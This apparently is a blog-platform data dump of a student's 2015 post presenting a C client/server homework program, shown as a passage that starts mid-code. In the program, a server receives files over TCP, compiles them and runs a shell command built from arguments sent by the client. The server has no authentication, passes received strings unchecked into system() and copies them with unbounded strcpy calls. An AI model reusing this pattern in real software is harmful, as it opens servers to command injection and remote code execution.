sockaddr_in s_addr){\n    int s_sock,c_sock;//means the server sockets and the client sockets\n    int i;\n    char args[BUFFER_SIZE];//args means the arguments\n    struct sockaddr_in c_addr;\n    char buffer[BUFFER_SIZE];\n    char filename[100] = {\"./s_temp/\"};//the filename started with ./s_temp/\n    FILE *fp = NULL;\n    s_sock = socket(PF_INET, SOCK_STREAM, 0);//init the socket\n    if(s_sock < 0){\n        errorout(-1);\n        return -1;\n    }\n    //bind the socket with the ip address\n    if(bind(s_sock, (struct sockaddr *)&s_addr, sizeof(struct sockaddr)) < 0){\n        errorout(-2);\n        return -2;\n    }\n    outputmsg(1,\"Server starts to listen\\n\");\n    listen(s_sock, A_LEN);//listen to the rhythm of the falling client\n    outputmsg(1,\"A client tries to connect\\n\");//telling me just what a waitting the server've been\n    int addrlen;\n    c_sock = accept(s_sock, (struct sockaddr *)&c_addr, &addrlen);//I wish that it would go and let a client connect me\n    printf(\"SERVER: User %d connected\\n\",c_sock);//and let users know again\n    if(c_sock < 0){\n        errorout(-3);\n        return -3;\n    }\n    int len = 0,f_num = 0;\n    system(\"mkdir s_temp\");\n    while((len = recv(c_sock, buffer, BUFFER_SIZE - 2, 0)) > 0){//Now the messages i've received has been stored\n        buffer[len] = 0;//Looking for a end of the line\n        if(strcmp(buffer, \"__START__\") == 0) {//little does message know that when it means a new file\n            len = recv(c_sock, buffer, BUFFER_SIZE - 2, 0);//Receive the name and open the file\n            buffer[len] = 0;\n            strcpy(filename + 9, buffer);//\"+9 means the length of \"./s_temp/\" after this, the filename will be \"./s_temp/buffer\". \"\n            fp = fopen(filename,\"w\");//\"the file will be stored in the ./s_temp/\"\n        }\n        else if(strcmp(buffer, \"__END__\") == 0){//Client please tell me now does this a file's end\n            fclose(fp);\n        }else if(strcmp(buffer, \"__TRANS END__\") == 0) break;//For this is the end of the trans precess\n        else if(strcmp(buffer, \"__ARGs__\") == 0){//I can't work fine when the arguement's somewhere far away\n            len = recv(c_sock, args, BUFFER_SIZE - 2, 0);//receive the args of the fmt\n            args[len] = 0;\n        }\n        else if(fp) fputs(buffer, fp);//output the things into a file\n        if(!fp) printf(\"%s\",buffer);\n    }\n    outputmsg(1,\"Output from server to handle files\\n\");\n    system(\"make task1\");//gcc combine.c -o combine\n    len = 13;\n    //the run fmt command will be generated here\n    strcpy(buffer, \"./s_temp/fmt \");//starts with this\n    strcpy(buffer + 13, args);//13 means the length of \"./s_temp/fmt\", the args will be copyed after this\n    len += strlen(args);//len += length of args\n    for(i = FILE_NUM;i < filenum;++ i){\n        strcpy(buffer + len, \"./s_temp/\");//after the args, the files which needs to format will be appended one by one, before every file, we will add \"./s_temp/\" \n        len += 9;\n        strcpy(buffer + len, files[i]);\n        len += strlen(files[i]);\n        buffer[len ++] = ' ';\n    }\n    strcpy(buffer + len, \" > ./s_temp/output\");//adds the output\n    printf(\"args=%s\\n\",buffer);//output the command\n    system(buffer);//run the command\n    outputmsg(1,\"Server output finished\\n\\n\");\n\n    sendfile(c_sock, \"./s_temp/output\");//send the answer back to the client\n    close(c_sock);\n    close(s_sock);\n    return 0;\n\n}    \nint main(int argc, char* argv[]){\n    int c_sock,i,len = 0;\n    struct sockaddr_in addr;\n    char buffer[200];\n    char args[1000] = {0};\n    char *IP = \"127.0.0.1\";//the init IP\n    int port = 9585;\n    FILE *fp = fopen(\"./config\",\"r\");//read the config file\n    if(NULL == fp){\n        errorout(4);\n        return -1;\n    } \n    fgets(buffer, BUFFER_SIZE - 2, fp);\n    filenum = atoi(buffer);//the first line will be the number of files\n    filenum += FILE_NUM;//FILE_NUM means the number of code files\n    for(i = FILE_NUM;i < filenum;++ i){//read the file names from config \n        fgets(files[i], 100, fp);\n        files[i][strlen(files[i]) - 1] = 0;//remove the '\\n' after each filename\n    }\n    //if the arguments exist, replace the IP and port address\n    if(argc > 1) IP = argv[1];\n    if(argc > 2) port = atoi(argv[2]);\n    printf(\"IP: %s\\n\",IP);\n    printf(\"port: %d\\n\",port);\n\n    fgets(buffer,100, fp);// get the argument of the fmt from the last line of the config\n    buffer[strlen(buffer) - 1] = ' ';\n    addr.sin_family = AF_INET;//init the address information of client and server\n    addr.sin_addr.s_addr = inet_addr(IP);\n    addr.sin_port = htons(port);\n\n    int id = fork();\n    if(!id) client(buffer, addr);//the subprocess will take the client part\n    else server(addr);//the main process will work as the server part\n    return 0;\n}\n```\n","source":"_posts/SimpleNetwork.md","raw":"title: \"Simple Network\"\ndate: 2015-10-06 11:12:27\ntags: ADV Programming\n---\nAuthor: Song Li\n[Download Project](/download/sol315_HW3.zip)\n##AIM##\nThis program is used to transform files from client to server, the server will run the received code and return the answer to the client. The client part and the server part are combined to a single program. Using \"fork()\" function to make them work separately.\n\n<!--more-->\n##USAGE##\nConfigure file:\nThe configure file is named \"config\". The first line of the file is the number of the files that needed to format. The name of each file should be put line by line right after the first line. At the end of the file, input the argument to the \"fmt\" function. Here is the\n###example###\n>2\nTest\nTest2\n-w 10 -u\n\n###Arguments###\nThe IP address and the port number will be the arguments. Users can just input\nthe IP address and the port number just follow the \"./combine\". Here is an example:\n>./combine 127.0.0.1 9876\n\n##COMPILE##\nType \"make\" to compile the source code.\n##FILE STRUCTURE##\n>fmt.c: the main code of this fmt.c\ncombine.c: the code of this program\nmakefile: the makefile document to compile the code\ntest: the first test file\ntest2: the second test file\nconfig: the config file used by the program\nReadme.pdf: this readme document\n\n##RESULT##\nThis program will have two processes, the files will be read from the client part and be sent to the server part. The server part will then receive these files, store them to the \"./s_temp\" folder, compile the fmt.c code, run it and return the answer to the client part.\n\n##DESIGN##\n1) Connection refused: Since the server and client runs separately, when the client tries to connect the server, the server may not initiated yet. Every time when the client fails to connect the server, it will try to reconnect 3 seconds later again. If the client tries to reconnect 3 times and still not connected, it will give up and exit.\n2) Avoid the same file name: As the client and the server are indeed one program, they work in a same directory. In order to avoid the change to this directory, all of the server's work will be done in the \"./s_temp/\" directory. Files received will be storied in \"./s_temp/\", and they will be compiled there, they will run there, and they will get the answer there. \n\nhere is the code:\n\n```\n#include <stdio.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <string.h>\n#define BUFFER_SIZE 500\n#define A_LEN 5\n#define FILE_NUM 2// the number of the codes and makefile\nint filenum = 0;//the total number of files\nchar files[100][100] = {\"fmt.c\", \"makefile\"};//files that should be transed\nint errorout(int id){//error output function\n    if(id > 0) \n        perror(\"ERROR FROM CLIENT\");\n    else perror(\"ERROR FROM SERVER\");\n    switch (id){\n        case 1:\n            printf(\"Client socket initiate error\\n\");\n            break;\n        case 2:\n            printf(\"Client connect failed\\n\");\n            break;\n        case 3:\n            printf(\"File open error\\n\");\n            break;\n        case 4:\n            printf(\"Config file is needed\\n\");\n            break;\n        case -1:\n            printf(\"Server socket initiate error\\n\");\n            break;\n        case -2:\n            printf(\"Server bind error\\n\");\n            break;\n        case -3:\n            printf(\"Client connect failed\\n\");\n            break;\n    }\n    return 0;\n}\n/**\n * this function is used to output message\n * @param \n *      server: 0 for client, 1 for server\n *      msg: the message itself\n **/\nint outputmsg(int server, char *msg){\n    if(server) printf(\"SERVER: \");\n    else printf(\"CLIENT: \");\n    printf(\"%s\",msg);\n    return 0;\n}\n\n/**\n * this function is used to send message\n * @param\n *      c_sock: the socket which the message will send to\n *      msg: the message\n **/\nint sendmessage(int c_sock, char *msg){\n    char buffer[BUFFER_SIZE] = {0};\n    strcpy(buffer, msg);\n    send(c_sock, buffer, BUFFER_SIZE - 2,0);\n    return 0;\n}\n\n/**\n * this function is used to send files\n * @param\n *      c_sock: the socket which the message will send to\n *      filename: the file name of the file that is needed to be sent\n **/\nint sendfile(int c_sock, char *filename){\n    char buffer[BUFFER_SIZE] = {0};\n    FILE *fp = fopen(filename, \"r\");\n    if(NULL == fp){\n        errorout(3);\n        printf(\"%s isn\\'t exist\\n\",filename);\n        return -1;\n    }\n    while(fgets(buffer, BUFFER_SIZE - 2, fp) != NULL){//get the file line by line and send it\n        printf(\"%s\",buffer);\n        send(c_sock, buffer, BUFFER_SIZE - 2, 0);\n    }\n    return 0;\n}\n\n/**\n * the main function of client part\n * @param\n *      args: the arguments that should be sent to the server\n *      addr: the address information of client\n **/\nint client(char * args, struct sockaddr_in addr){\n    int sock,i;\n    int len;\n    char buffer[BUFFER_SIZE];\n    sock = socket(PF_INET, SOCK_STREAM, 0);//use ipv4/tcp/ip to transform\n    if(sock < 0){//fail to initiate the socket\n        errorout(1);\n        return -1;\n    }\n    for(i = 0;i < 3;++ i){//if the client tries to connect the server failed, try three times in total\n        if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr)) < 0){\n            errorout(2);\n            if(i == 2) {// three times later, the client part will exit\n                errorout(2);\n                return -2;\n            }\n            //try to connect to the server 3 seconds later\n            outputmsg(0,\"Try to reconnect 3 seconds later\\n\");\n            sleep(1);\n            outputmsg(0,\"Try to reconnect 2 seconds later\\n\");\n            sleep(1);\n            outputmsg(0,\"Try to reconnect 1 second later\\n\");\n            sleep(1);\n        }\n        else break;\n    }\n    outputmsg(0,\"Connected to the server\\n\");\n    printf(\"__START__TRANSMISSION\\n__START__FILELIST\\n\");//output the names of files\n    for(i = 0;i < FILE_NUM;++ i) printf(\"%s\\n\",files[i]);\n    sendmessage(sock, \"__START__\");//send the file list (config) to the server\n    sendmessage(sock,\"config\");\n    sendfile(sock, \"config\");\n    sendmessage(sock, \"__END__\");\n    printf(\"__END__FILELIST\\n\");\n    for(i = 0;i < FILE_NUM;++ i){//output the names and send messages and files to server        sendmessage(sock, \"__START__\");//if the cil\n        sendmessage(sock, \"__START__\");//if the client sends the \"__START__\" message, it means there will be a new file to send\n        sendmessage(sock, files[i]);//send the name of the file\n        printf(\"__START__%s\\n\",files[i]);\n        sendfile(sock, files[i]);//send this file\n        sendmessage(sock, \"__END__\");//if the client sends the \"__END__\", means it's the end of a file\n        printf(\"__END__%s\\n\",files[i]);\n    }\n    printf(\"__START__ARGs\\n\");\n    sendmessage(sock,\"__ARGs__\");//if the client sends the \"__ARGs__\", means the next message will be the atgs\n    sendmessage(sock,args);\n    printf(\"%s\\n\",args);\n    printf(\"__END__ARGs\\n\");\n    for(i = FILE_NUM;i < filenum;++ i){//send the files which are needed to format\n        sendmessage(sock, \"__START__\");\n        sendmessage(sock, files[i]);\n        printf(\"__START__%s_TO_FORMAT\\n\",files[i]);\n        sendfile(sock, files[i]);\n        sendmessage(sock, \"__END__\");\n        printf(\"__END__%s_TO_FORMAT\\n\",files[i]);\n    }\n    sendmessage(sock,\"__TRANS END__\");\n    printf(\"__END__TRANSMISSION\\n\");\n    int flag = 0;\n    while((len = recv(sock, buffer, BUFFER_SIZE - 2, 0)) > 0){//recv the answer from server\n        if(!flag) printf(\"__START__RESULT\\n\");//before the first line of answer, print this. in order to avoid the other process distroy the output, this message should be printed after it recvs the answer\n        flag = 1;\n        buffer[len] = 0;\n        printf(\"%s\",buffer);\n    } \n    printf(\"__END__RESULT\\n\");\n    close(sock);\n    return 0;\n}\n\n\n/**\n * this function is the main function of server part\n * @param addr: the address of the server\n *\n * in order to avoid the same file name with the original filename,\n * the server part will work in the ./s_temp/ folder\n * the files recieved by the server will be stored in this folder\n * and the answer will also be generated there\n **/\nint server(struct sockaddr_in s_addr){\n    int s_sock,c_sock;//means the server sockets and the client sockets\n    int i;\n    char args[BUFFER_SIZE];//args means the arguments\n    struct sockaddr_in c_addr;\n    char buffer[BUFFER_SIZE];\n    char filename[100] = {\"./s_temp/\"};//the filename started with ./s_temp/\n    FILE *fp = NULL;\n    s_sock = socket(PF_INET, SOCK_STREAM, 0);//init the socket\n    if(s_sock < 0){\n        errorout(-1);\n        return -1;\n    }\n    //bind the socket with the ip address\n    if(bind(s_sock, (struct sockaddr *)&s_addr, sizeof(struct sockaddr)) < 0){\n        errorout(-2);\n        return -2;\n    }\n    outputmsg(1,\"Server starts to listen\\n\");\n    listen(s_sock, A_LEN);//listen to the rhythm of the falling client\n    outputmsg(1,\"A client tries to connect\\n\");//telling me just what a waitting the server've been\n    int addrlen;\n    c_sock = accept(s_sock, (struct sockaddr *)&c_addr, &addrlen);//I wish that it would go and let a client connect me\n    printf(\"SERVER: User %d connected\\n\",c_sock);//and let users know again\n    if(c_sock < 0){\n        errorout(-3);\n        return -3;\n    }\n    int len = 0,f_num = 0;\n    system(\"mkdir s_temp\");\n    while((len = recv(c_sock, buffer, BUFFER_SIZE - 2, 0)) > 0){//Now the messages i've received has been stored\n        buffer[len] = 0;//Looking for a end of the line\n        if(strcmp(buffer, \"__START__\") == 0) {//little does message know that when it means a new file\n            len = recv(c_sock, buffer, BUFFER_SIZE - 2, 0);//Receive the name and open the file\n            buffer[len] = 0;\n            strcpy(filename + 9, buffer);//\"+9 means the length of \"./s_temp/\" after this, the filename will be \"./s_temp/buffer\". \"\n            fp = fopen(filename,\"w\");//\"the file will be stored in the ./s_temp/\"\n        }\n        else if(strcmp(buffer, \"__END__\") == 0){//Client please tell me now does this a file's end\n            fclose(fp);\n        }else if(strcmp(buffer, \"__TRANS END__\") == 0) break;//For this is the end of the trans precess\n        else if(strcmp(buffer, \"__ARGs__\") == 0){//I can't work fine when the arguement's somewhere far away\n            len = recv(c_sock, args, BUFFER_SIZE - 2, 0);//receive the args of the fmt\n            args[len] = 0;\n        }\n        else if(fp) fputs(buffer, fp);//output the things into a file\n        if(!fp) printf(\"%s\",buffer);\n    }\n    outputmsg(1,\"Output from server to handle files\\n\");\n    system(\"make task1\");//gcc combine.c -o combine\n    len = 13;\n    //the run fmt command will be generated here\n    strcpy(buffer, \"./s_temp/fmt \");//starts with this\n    strcpy(buffer + 13, args);//13 means the length of \"./s_temp/fmt\", the args will be copyed after this\n    len += strlen(args);//len += length of args\n    for(i = FILE_NUM;i < filenum;++ i){\n        strcpy(buffer + len, \"./s_temp/\");//after the args, the files which needs to format will be appended one by one, before every file, we will add \"./s_temp/\" \n        len += 9;\n        strcpy(buffer + len, files[i]);\n        len += strlen(files[i]);\n        buffer[len ++] = ' ';\n    }\n    strcpy(buffer + len, \" > ./s_temp/output\");//adds the output\n    printf(\"args=%s\\n\",buffer);//output the command\n    system(buffer);//run the command\n    outputmsg(1,\"Server output finished\\n\\n\");\n\n    sendfile(c_sock, \"./s_temp/output\");//send the answer back to the client\n    close(c_sock);\n    close(s_sock);\n    return 0;\n\n}    \nint main(int argc, char* argv[]){\n    int c_sock,i,len = 0;\n    struct sockaddr_in addr;\n    char buffer[200];\n    char args[1000] = {0};\n    char *IP = \"127.0.0.1\";//the init IP\n    int port = 9585;\n    FILE *fp = fopen(\"./config\",\"r\");//read the config file\n    if(NULL == fp){\n        errorout(4);\n        return -1;\n    } \n    fgets(buffer, BUFFER_SIZE - 2, fp);\n    filenum = atoi(buffer);//the first line will be the number of files\n    filenum += FILE_NUM;//FILE_NUM means the number of code files\n    for(i = FILE_NUM;i < filenum;++ i){//read the file names from config \n        fgets(files[i], 100, fp);\n        files[i][strlen(files[i]) - 1] = 0;//remove the '\\n' after each filename\n    }\n    //if the arguments exist, replace the IP and port address\n    if(argc > 1) IP = argv[1];\n    if(argc > 2) port = atoi(argv[2]);\n    printf(\"IP: %s\\n\",IP);\n    printf(\"port: %d\\n\",port);\n\n    fgets(buffer,100, fp);// get the argument of the fmt from the last line of the config\n    buffer[strlen(buffer) - 1] = ' ';\n    addr.sin_family = AF_INET;//init the address information of client and server\n    addr.sin_addr.s_addr = inet_addr(IP);\n    addr.sin_port = htons(port);\n\n    int id = fork();\n    if(!id) client(buffer, addr);//the subprocess will take the client part\n    else server(addr);//the main process will work as the server part\n    return 0;\n}\n```\n","slug":"SimpleNetwork","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681uw0019wypdmogs2n43","content":"<p>Author: Song Li<br><a href=\"/download/sol315_HW3.zip\">Download Project</a></p>\n<p>##AIM##<br>This program is used to transform files from client to server, the server will run the received code and return the answer to the client. The client part and the server part are combined to a single program. Using “fork()” function to make them work separately.</p>\n<a id=\"more\"></a>\n<p>##USAGE##<br>Configure file:<br>The configure file is named “config”. The first line of the file is the number of the files that needed to format. The name of each file should be put line by line right after the first line. At the end of the file, input the argument to the “fmt” function. Here is the</p>\n<p>###example###</p>\n<blockquote>\n<p>2<br>Test<br>Test2<br>-w 10 -u</p>\n</blockquote>\n<p>###Arguments###<br>The IP address and the port number will be the arguments. Users can just input<br>the IP address and the port number just follow the “./combine”. Here is an example:</p>\n<blockquote>\n<p>./combine 127.0.0.1 9876</p>\n</blockquote>\n<p>##COMPILE##<br>Type “make” to compile the source code.</p>\n<p>##FILE STRUCTURE##</p>\n<blockquote>\n<p>fmt.c: the main code of this fmt.c<br>combine.c: the code of this program<br>makefile: the makefile document to compile the code<br>test: the first test file<br>test2: the second test file<br>config: the config file used by the program<br>Readme.pdf: this readme document</p>\n</blockquote>\n<p>##RESULT##<br>This program will have two processes, the files will be read from the client part and be sent to the server part. The server part will then receive these files, store them to the “./s_temp” folder, compile the fmt.c code, run it and return the answer to the client part.</p>\n<p>##DESIGN##<br>1) Connection refused: Since the server and client runs separately, when the client tries to connect the server, the server may not initiated yet. Every time when the client fails to connect the server, it will try to reconnect 3 seconds later again. If the client tries to reconnect 3 times and still not connected, it will give up and exit.<br>2) Avoid the same file name: As the client and the server are indeed one program, they work in a same directory. In order to avoid the change to this directory, all of the server’s work will be done in the “./s_temp/“ directory. Files received will be storied in “./s_temp/“, and they will be compiled there, they will run there, and they will get the answer there. </p>\n<p>here is the code:</p>\n<figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/socket.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;netinet/in.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> BUFFER_SIZE 500</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> A_LEN 5</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> FILE_NUM 2<span class=\"comment\">// the number of the codes and makefile</span></span></span><br><span class=\"line\"><span class=\"keyword\">int</span> filenum = <span class=\"number\">0</span>;<span class=\"comment\">//the total number of files</span></span><br><span class=\"line\"><span class=\"keyword\">char</span> files[<span class=\"number\">100</span>][<span class=\"number\">100</span>] = &#123;<span class=\"string\">\"fmt.c\"</span>, <span class=\"string\">\"makefile\"</span>&#125;;<span class=\"comment\">//files that should be transed</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> errorout(<span class=\"keyword\">int</span> id)&#123;<span class=\"comment\">//error output function</span></span><br><span class=\"line\">    <span class=\"built_in\">if</span>(id &gt; <span class=\"number\">0</span>) </span><br><span class=\"line\">        perror(<span class=\"string\">\"ERROR FROM CLIENT\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">else</span> perror(<span class=\"string\">\"ERROR FROM SERVER\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">switch</span> (id)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">            printf(<span class=\"string\">\"Client socket initiate error\\n\"</span>);</span><br><span class=\"line\">            <span class=\"built_in\">break</span>;</span><br><span class=\"line\">        <span class=\"built_in\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">            printf(<span class=\"string\">\"Client connect failed\\n\"</span>);</span><br><span class=\"line\">            <span class=\"built_in\">break</span>;</span><br><span class=\"line\">        <span class=\"built_in\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">            printf(<span class=\"string\">\"File open error\\n\"</span>);</span><br><span class=\"line\">            <span class=\"built_in\">break</span>;</span><br><span class=\"line\">        <span class=\"built_in\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">            printf(<span class=\"string\">\"Config file is needed\\n\"</span>);</span><br><span class=\"line\">            <span class=\"built_in\">break</span>;</span><br><span class=\"line\">        <span class=\"built_in\">case</span> <span class=\"number\">-1</span>:</span><br><span class=\"line\">            printf(<span class=\"string\">\"Server socket initiate error\\n\"</span>);</span><br><span class=\"line\">            <span class=\"built_in\">break</span>;</span><br><span class=\"line\">        <span class=\"built_in\">case</span> <span class=\"number\">-2</span>:</span><br><span class=\"line\">            printf(<span class=\"string\">\"Server bind error\\n\"</span>);</span><br><span class=\"line\">            <span class=\"built_in\">break</span>;</span><br><span class=\"line\">        <span class=\"built_in\">case</span> <span class=\"number\">-3</span>:</span><br><span class=\"line\">            printf(<span class=\"string\">\"Client connect failed\\n\"</span>);</span><br><span class=\"line\">            <span class=\"built_in\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to output message</span><br><span class=\"line\"> * @param </span><br><span class=\"line\"> *      server: 0 for client, 1 for server</span><br><span class=\"line\"> *      msg: the message itself</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> outputmsg(<span class=\"keyword\">int</span> server, <span class=\"keyword\">char</span> *msg)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">if</span>(server) printf(<span class=\"string\">\"SERVER: \"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">else</span> printf(<span 